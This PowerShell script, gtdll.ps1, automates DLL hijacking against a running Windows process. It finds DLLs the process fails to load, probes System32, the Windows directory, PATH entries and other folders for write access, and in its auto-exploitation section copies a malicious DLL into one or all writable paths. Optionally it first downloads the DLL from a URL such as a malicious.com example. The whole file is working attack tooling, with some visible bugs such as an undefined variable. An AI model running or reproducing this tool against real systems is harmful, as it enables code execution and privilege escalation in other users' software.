<#
.Synopsis
   DLL hijacking is techique which allows to abuse the library search order to gain execution in a process. If the current user is able to write in the directories where the system search, it will be possible to put a malicious DLL on site. When the executable attempts to load the expected library, they will instead load the malicious one.
   Commonly, Windows treat to obtain the DLLs in the standard indicated location, but if the DLL is not found there, OS will find these in some known directories:
   - The directory from which the application loaded
   - The system directory (C:\Windows\System32\)
   - The 16-bit system directory (C:\Windows\System\)
   - The Windows directory (C:\Windows\)
   - The current directory (.\)
   - The directories that are listed in the %PATH% environment variable
.DESCRIPTION
   gtdll.ps1 wants to be an automatization of the DLL hijacking process. The script has three steps. 
   1. Cantidate DLLs detection: Since a process, it is searched all the .dll files that the process load when this is executed. In particular, the script search for all the dll files with "NOT FOUND" status. This condition will allow us to perform a dll hijacking attack.
   2. Searching section: The script will search the dll files in some strategic paths to detect paths were the current usre has write access. Paths are:
    - The directory from which the application loaded
    - The system directory
    - The 16-bit system directory
    - The Windows directory
    - The current directory
    - The directories that are listed in the PATH environment variable
   3. Auto-exploitation section: This is an optional feature. If the user wants the script perform de dll hijacking, the script would exploit that.
.PARAMETERS
    -process <process>: Mandatory parameter. Indicates the target process. This process should be active at the moment of execute the script. Don't include ".exe" extention.
    -autoexploitation: Switch parameter. If it is activated, script will try to perform the dll hijacking.
    -type <autoxplotation_mode>:
            f: First path mode. The script will inject the dll file in the first possible path.
            a: Annihilation mode. The script will inject the dll in all the paths.
    -dllp <dll_path>: Malicious dll path.
    -url <dll_url>: Download the dll from internet.   
.EXAMPLE
   ./gtdll.ps1 -process explorer
.EXAMPLE
   ./gtdll.ps1 -process firefox -autoexploitation -f -dllp .\malicious.dll
.EXAMPLE
   ./gtdll.ps1 -process chrome -autoexploitation -a -url https://malicious.com/malicius-dll.dll
.EXAMPLE
   ./gtdll.ps1 -process firefox
#>

#PARAMETERS
param (
    [Parameter(Mandatory=$true)][String]$process,
    [switch]$autoexploitation = $false,
    [char]$type = 'f', #a | f
    [string]$dllp = ".\malicious.dll",
    [string]$url = "stringdefault"
 )

$hr = Get-Date -Format "MM_dd_yyyy_HH_mm" 
python utilities/banner.py
$Logfile = ".\logs\gtl_$hr.log"
$logPath = ".\logs"
if (Test-Path $logPath){
    echo "OK" | out-null
}
else{
    mkdir ".\logs" -ErrorAction SilentlyContinue | out-null
}

function LogWrite{  
   Param ([string]$logstring)
   Add-content $Logfile -value $logstring
}

function Write-HostCenter { param($Message) Write-Host ("{0}{1}" -f (' ' * (([Math]::Max(0, $Host.UI.RawUI.BufferSize.Width / 2) - [Math]::Floor($Message.Length / 2)))), $Message) }
function Get-RandomAlphanumericString {	
	[CmdletBinding()]
	Param (
        [int] $length = 8
	)
	Begin{
	}
	Process{
        Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count $length  | % {[char]$_}) )
        LogWrite "Generating random file name..."
	}	
}

LogWrite "Parameters"
LogWrite "Process: $process"
LogWrite "Autoexpl: $autoexploitation"
LogWrite "Autoexpl. type: $type"
LogWrite "Malicious DLL path: $dllp"
LogWrite "Malicious DLL URL: $url"

if ((get-process $process -ErrorAction Ignore) -eq $Null) { Write-Host "Process $process is not running currently";LogWrite "Process $process is not running currently"; return    }
else{ Write-Host -BackgroundColor Black "Process $process running currently"; LogWrite "Process $process running currently"    }

$dll_path=$dllp
#DELETE OLD FILES
LogWrite "Removing old files: .\tmp\tmp1.io"
LogWrite "Removing old files: .\tmp\$process.tmp"
LogWrite "Removing old files: .\tmp\$process-dll-list.prc"
LogWrite "Removing old files: .\tmp\$process-dll-status.prc"
rm ".\tmp\tmp1.io" -Force -ErrorAction SilentlyContinue
rm ".\tmp\$process.tmp" -Force -ErrorAction SilentlyContinue
rm ".\tmp\$process-dll-list.prc" -Force -ErrorAction SilentlyContinue
rm ".\tmp\$process-dll-status.prc" -Force -ErrorAction SilentlyContinue
Write-HostCenter "**************DLL's CANDIDATES SELECTION SECTION**************"
LogWrite "**************DLL's CANDIDATES SELECTION SECTION**************"
$tmp = ".\tmp\$process.tmp"
$final = ".\tmp\$process-dll-list.prc"
$statusf = ".\tmp\$process-dll-status.prc"
Get-Process $process | select -ExpandProperty modules | Format-Table -AutoSize -Property FileName | Out-File -FilePath $tmp -Append
LogWrite "Using $tmp"
Get-Content $tmp | Where-Object {$_ -notmatch 'FileName|----|.exe'} | ? {$_.trim() -ne "" } | Set-Content $final
LogWrite "Using $final"
Remove-Item $tmp
LogWrite "Removing $tmp"

$content = Get-Content $final
Remove-Item $final
$content | Foreach {$_.TrimEnd()} | sort | get-unique | Set-Content $final

LogWrite "Creating arrays"
$not_found = [System.Collections.ArrayList]@()
$files_only = [System.Collections.ArrayList]@()
$i=0
foreach($fl in Get-Content $final) {
    LogWrite "Testing $fl"
    if (Test-Path $fl -PathType leaf){
    echo "$fl,FILE EXISTS," | Out-File -FilePath $statusf -Append
    LogWrite "$fl,FILE EXISTS,MM_dd_yyyy_HH_mm"
    Write-Host "Testting file $fl. Result: FOUND"
    }
	else{ 
    $not_found.add($fl) | out-null
    $files_only.add($fl.Split('\')[-1]) | out-null
    echo "$fl,FILE NOT FOUND" | Out-File -FilePath $statusf -Append
    LogWrite "CANDIDATE!! $fl. Status: NOT FOUND,MM_dd_yyyy_HH_mm"
	Write-Host  -BackgroundColor Blue "CANDIDATE!! $fl. Status: NOT FOUND"
	}
}

if ($files_only -ge 0){
    Write-Host "Exist at least one dll that was not found"
    LogWrite "Exist at least one dll that was not found"
    $files_only = $files_only | select -Unique
}
else{
    Write-Host "Not exists dll that was not found. Finalizing . . ."
    LogWrite "Not exists dll that was not found. Finalizing . . ."
    return
}

Write-HostCenter "**************SEARCH SECTION**************"
LogWrite "**************SEARCH SECTION**************"
$POSSIBLE_PATHS = [System.Collections.ArrayList]@()
Write-Host -BackgroundColor Black "------------------------------> SEARCHING IN APPLICATION DIRECTORY" | Out-File -FilePath $statusf -Append
LogWrite "------------------------------> SEARCHING IN APPLICATION DIRECTORY"

$not_found = [System.Collections.ArrayList]@()
Get-Process $process | Select-Object Path | Out-File -FilePath ".\tmp\tmp.io" -Append
Get-Content ".\tmp\tmp.io" | Where-Object {$_ -notmatch 'Path|----'} | ? {$_.trim() -ne "" } | Set-Content .\tmp\tmp1.io 
gc ".\tmp\tmp1.io" | sort | get-unique > ".\tmp\tmp.io"
rm ".\tmp\tmp1.io"
LogWrite "Removing .\tmp\tmp1.io"
$endp = cat ".\tmp\tmp.io"
$endp
$endp = $endp.Substring(0, $endp.lastIndexOf('\'))
rm ".\tmp\tmp.io"
LogWrite "Removing .\tmp\tmp.io"
$bnd=0
$i=0
foreach($file in $files_only) {
    Write-Host "Current file: $file"
    LogWrite "Current file: $file"
    Write-Host "Current path: $endp"
    LogWrite "Current path: $endp"
    if (Test-Path "$endp$file" -PathType leaf){
        Write-Host "Current pathfile: $endp\$file"
            Write-Host "$file exist in $endp" | Out-File -FilePath $statusf -Append
            LogWrite "$file exist in $endp" 
            $bnd=1
        }
    $paths= "$endp\"
    if ($bnd -eq 0){
        $i=1
        Write-Host  -BackgroundColor Cyan  -ForegroundColor Black "Candidate $file not exists in $endp" | Out-File -FilePath $statusf -Append
        LogWrite "Candidate $file not exists in $endp"
    }
    $bnd=0
}
if ($bnd -eq 0 -OR $i -eq 1){
    $cu = whoami
        $current_user = $cu.Split('\')[-1]         
            $dummy = echo (Get-RandomAlphanumericString -length 22 | Tee-Object -variable teeTime )
            if (Test-Path $paths){
            $output = New-Item -Path "$paths" -Name "$dummy" -ItemType "file" -ErrorAction SilentlyContinue
                if ($output){
                    Write-Host -BackgroundColor Red  "***************** User $cu has write rights on folder $paths"
                    LogWrite "***************** User $cu has write rights on folder $paths"
                    $POSSIBLE_PATHS.add($paths) | out-null
                }
                else{
                Write-Host "User $cu doesn't have write access on $paths"
                LogWrite "User $cu doesn't have write access permission on $paths"
                }
            }
            rm $paths$dummy -Force -ErrorAction SilentlyContinue
            rm -Path "$paths\$dummy" -Force -ErrorAction SilentlyContinue
}

Write-Host -BackgroundColor Black "------------------------------> SEARCHING IN SYSTEM DIRECTORY - C:\Windows\System32\" | Out-File -FilePath $statusf -Append
LogWrite "------------------------------> SEARCHING IN SYSTEM DIRECTORY C:\Windows\System32\"

$not_found = [System.Collections.ArrayList]@()
$endp = "C:\Windows\System32\"
LogWrite "$endp"
$bnd=0
$i=0
foreach($file in $files_only) {
    Write-Host "Current file: $file"
    LogWrite "Current file: $file"
    LogWrite "Current path: $endp"
    Write-Host "Current path: $endp"
    if (Test-Path "$endp$file" -PathType leaf){
            Write-Host "Current pathfile: $endp$file"
            LogWrite "Current pathfile: $endp$file"
            Write-Host "$file exist $endp" | Out-File -FilePath $statusf -Append
            LogWrite "$file exist $endp"
            $bnd=1
        }
    if ($bnd -eq 0){
        Write-Host  -BackgroundColor Cyan  -ForegroundColor Black "Candidate $file not exists in $endp" | Out-File -FilePath $statusf -Append
        LogWrite "Candidate $file not exists in $endp"
        $i=1
    }
    $bnd=0
}
    $paths= "$endp"
    if ($bnd -eq 0 -OR $i -eq 1){
       $cu = whoami
        $current_user = $cu.Split('\')[-1]
            $dummy = echo (Get-RandomAlphanumericString -length 22 | Tee-Object -variable teeTime )
            LogWrite "Creating dummy"
            if (Test-Path $paths){
            $output = New-Item -Path "$paths" -Name "$dummy" -ItemType "file" -ErrorAction SilentlyContinue
            if ($output){
                Write-Host -BackgroundColor Red  "***************** User $cu has write rights on folder $paths"
                LogWrite "***************** User $cu has write rights on folder $paths"
                $POSSIBLE_PATHS.add($paths) | out-null
            }
            else{
                Write-Host "User $cu doesn't have write access on $paths"
                LogWrite "User $cu doesn't have write access on $paths"
            }
            rm $paths$dummy -Force -ErrorAction SilentlyContinue
            rm -Path "$paths\$dummy" -Force -ErrorAction SilentlyContinue
        }
    }

Write-Host -BackgroundColor Black "------------------------------> SEARCHING IN 16-BIT SYSTEM DIRECTORY - C:\Windows\System\" | Out-File -FilePath $statusf -Append
LogWrite "------------------------------> SEARCHING IN 16-BIT SYSTEM DIRECTORY C:\Windows\System\"
$not_found = [System.Collections.ArrayList]@()
$endp = "C:\Windows\System\"
$bnd=0
$i=0
foreach($file in $files_only) {
    Write-Host "Current file: $file"
    LogWrite "Current file: $file"
    LogWrite "Current path: $endp"
    Write-Host "Current path: $endp"
    if (Test-Path "$endp$file" -PathType leaf){
            Write-Host "Current pathfile: $endp$file"
            LogWrite "Current pathfile: $endp$file"
            Write-Host "$file exist in $endp" | Out-File -FilePath $statusf -Append
            LogWrite "$file exist in $endp"
            $bnd=1
        }
    if ($bnd -eq 0){
        Write-Host  -BackgroundColor Cyan  -ForegroundColor Black "Candidate $file not exists in $endp" | Out-File -FilePath $statusf -Append
        LogWrite "Candidate $file not exists in $endp"
        $i=1
    }
    $bnd=0    
}
    $paths= "$endp"
    if ($bnd -eq 0 -OR $i -eq 1){
        $cu = whoami
        $current_user = $cu.Split('\')[-1]
            $dummy = echo (Get-RandomAlphanumericString -length 22 | Tee-Object -variable teeTime )
            LogWrite "Creating dummy"
            if (Test-Path $paths){
            $output = New-Item -Path "$paths" -Name "$dummy" -ItemType "file" -ErrorAction SilentlyContinue
            if ($output){
                Write-Host -BackgroundColor Red  "***************** User $cu has write rights on folder $paths"
                LogWrite "***************** User $cu has write rights on folder $paths"
                $POSSIBLE_PATHS.add($paths) | out-null
            }
            else{
                Write-Host "User $cu doesn't have write access on $paths"
                LogWrite "User $cu doesn't have write access on $paths"
            }
            rm $paths$dummy -Force -ErrorAction SilentlyContinue
            rm -Path "$paths\$dummy" -Force -ErrorAction SilentlyContinue
        }
    }

Write-Host -BackgroundColor Black "------------------------------> SEARCHING IN WINDOWS DIRECTORY - C:\Windows\" | Out-File -FilePath $statusf -Append
LogWrite "------------------------------> SEARCHING IN WINDOWS DIRECTORY - C:\Windows\"
$not_found = [System.Collections.ArrayList]@()
$endp = "C:\Windows\"
$bnd=0
$i=0
foreach($file in $files_only) {
    Write-Host "Current file: $file"
    LogWrite "Current file: $file"
    LogWrite "Current path: $endp"
    Write-Host "Current path: $endp"
    if (Test-Path "$endp$file" -PathType leaf){
            Write-Host "Current pathfile: $endp$file"
            LogWrite "Current pathfile: $endp$file"
            Write-Host "$file exist in $endp" | Out-File -FilePath $statusf -Append
            LogWrite "$file exist in $endp"
            $bnd=1
        }
    if ($bnd -eq 0){
        Write-Host  -BackgroundColor Cyan  -ForegroundColor Black "Candidate $file not exists in $endp" | Out-File -FilePath $statusf -Append
        LogWrite "Candidate $file not exists in $endp"
        $i=1
    }
    $bnd=0     
}
    $paths= "$endp"
    if ($bnd -eq 0 -OR $i -eq 1){
        $cu = whoami
        $current_user = $cu.Split('\')[-1]
            $dummy = echo (Get-RandomAlphanumericString -length 22 | Tee-Object -variable teeTime )
            LogWrite "Creating dummy"
            if (Test-Path $paths){
            $output = New-Item -Path "$paths" -Name "$dummy" -ItemType "file" -ErrorAction SilentlyContinue
            if ($output){
                Write-Host -BackgroundColor Red  "***************** User $cu has write rights on folder $paths"
                LogWrite "***************** User $cu has write rights on folder $paths"
                $POSSIBLE_PATHS.add($paths) | out-null
            }
            else{
                Write-Host "User $cu doesn't have write access on $paths"
                LogWrite "User $cu doesn't have write access on $paths"
            }
            rm $paths$dummy -Force -ErrorAction SilentlyContinue
            rm -Path "$paths\$dummy" -Force -ErrorAction SilentlyContinue
        }
    }

Write-Host -BackgroundColor Black "------------------------------> SEARCHING IN %PATH%" | Out-File -FilePath $statusf -Append
LogWrite "------------------------------> SEARCHING IN %PATH%" 
$windows_path = $env:Path
$paths_windows = $windows_path -split ';'

$not_found = [System.Collections.ArrayList]@()
$candidates_paths = [System.Collections.ArrayList]@()
$i=0
foreach($endp in $paths_windows) {
    $bnd=0
    foreach($file in $files_only) {
        if (Test-Path "$endp$file" -PathType leaf){
            Write-Host "$file exist in $endp" | Out-File -FilePath $statusf -Append
            LogWrite "$file exist in $endp" 
            $bnd=1
        }
        if ($bnd -eq 0){
            Write-Host  -BackgroundColor Cyan  -ForegroundColor Black "Candidate $file not exists in $endp" | Out-File -FilePath $statusf -Append
            $candidates_paths.add($endp) | out-null
            LogWrite "Candidate $file not exists in $endp"
        }
    }   
}
Write-Host "Testing write access"
LogWrite "Testing write access"
$cu = whoami
$current_user = $cu.Split('\')[-1]  
foreach($paths in $candidates_paths) {
    $dummy = echo (Get-RandomAlphanumericString -length 22 | Tee-Object -variable teeTime )
    if (Test-Path $paths){
            $output = New-Item -Path "$paths" -Name "$dummy" -ItemType "file" -ErrorAction SilentlyContinue
            if ($output){
                Write-Host -BackgroundColor Red  "***************** User $cu has write rights on folder $paths"
                $POSSIBLE_PATHS.add($paths) | out-null
            }
            else{
                Write-Host "User $cu doesn't have write access on $paths"
            }
            rm $paths$dummy -Force -ErrorAction SilentlyContinue
            rm -Path "$paths\$dummy" -Force -ErrorAction SilentlyContinue
    }
}

Write-Host -BackgroundColor Black "------------------------------> SEARCHING IN CURRENT DIRECTORY- .\" | Out-File -FilePath $statusf -Append
LogWrite "------------------------------> SEARCHING IN CURRENT DIRECTORY - .\"
$not_found = [System.Collections.ArrayList]@()
$endp = ".\"
$bnd=0
$i=0
foreach($file in $files_only) {
    Write-Host "Current file: $file"
    Write-Host "Current path: $endp"
    if (Test-Path "$endp$file" -PathType leaf){
        Write-Host "Current pathfile: $endp$file"
            Write-Host "$file exist in $endp" | Out-File -FilePath $statusf -Append
            $bnd=1
        }
    if ($bnd -eq 0){
        Write-Host  -BackgroundColor Cyan  -ForegroundColor Black "Candidate $file not exists in $endp" | Out-File -FilePath $statusf -Append
        LogWrite "Candidate $file not exists in $endp"
        $i=1
    }
    $bnd=0     
}
    $paths= "$endp"
    if ($bnd -eq 0 -OR $i -eq 1){
        $cu = whoami
        $current_user = $cu.Split('\')[-1]
            $dummy = echo (Get-RandomAlphanumericString -length 22 | Tee-Object -variable teeTime )
            if (Test-Path $paths){
            $output = New-Item -Path "$paths" -Name "$dummy" -ItemType "file" -ErrorAction SilentlyContinue
            if ($output){
                Write-Host -BackgroundColor Red  "***************** User $cu has write rights on folder $paths"
                LogWrite "***************** User $cu has write rights on folder $paths"
                $POSSIBLE_PATHS.add($paths) | out-null
            }
            else{
                Write-Host "User $cu doesn't have write access on $paths"
                LogWrite "User $cu doesn't have write access on $paths"
            }
            rm $paths$dummy -Force -ErrorAction SilentlyContinue
            rm -Path "$paths\$dummy" -Force -ErrorAction SilentlyContinue
        }
    }

if (!$autoexploitation){
    return
}


Write-HostCenter "**************AUTO EXPLOITATION SECTION**************"
Write 
$x=0
if (Test-Path $dll_path){
    $x=1
}

if ($url -ne "stringdefault" -AND $x -eq 0){
    Write-Host "URL mode"
    LogWrite "URL mode"
    Invoke-WebRequest -Uri $url -OutFile ".\downloaded.com"
    LogWrite "Download $url in .\downloaded.com"
}

if ($type -eq 'f' -OR $type -eq 'F'){#FIRST POSSSIBLE
    $b=0
    LogWrite "FIRST POSSIBLE MODE"
    Write-Host "Dll es $dll_path"
    LogWrite "Dll es $dll_path"
    foreach($newfilename in $files_only) {
        foreach($paths_to_inject in $POSSIBLE_PATHS) {
            Write-Host ("Injecting in $paths_to_inject")
            LogWrite "Injecting in $paths_to_inject"
            if (Test-Path $dll_path){
                $output=Copy-Item $dll_path "$paths_to_inject\$newfilename"
                    if ($output){
                        Write-Host "***************** INCORRECT"
                        LogWrite "***************** INCORRECT"
                    }
                    else{
                        Write-Host "***************** CORRECT"
                        LogWrite "***************** CORRECT"
                        Write-Host "$dll_path -> $paths_to_inject\$newfilename"
                        LogWrite "$dll_path -> $paths_to_inject\$newfilename"
                        $b=1
                    }
            }    
            if( $b -eq 1){break}
        }
    }
}

if ($type -eq 'a' -OR $type -eq 'A'){ #TREAT TO ALL
    $b=0
    LogWrite "ANNIHILATION MODE"
    foreach($newfilename in $files_only) {
        foreach($paths_to_inject in $POSSIBLE_PATHS) {
            if (Test-Path $dll_path){
                LogWrite "Injecting $dll_path in $paths_to_inject"
                Write-Host ("Injecting $dll_path in $paths_to_inject")
                $output=Copy-Item $dllpath "$paths_to_inject\$newfilename"
                LogWrite "***************** CORRECT"
                LogWrite "$dll_path -> $paths_to_inject\$newfilename"
                Write-Host "***************** CORRECT"
                Write-Host "$dll_path -> $paths_to_inject\$newfilename"
            }
        }        
    }
}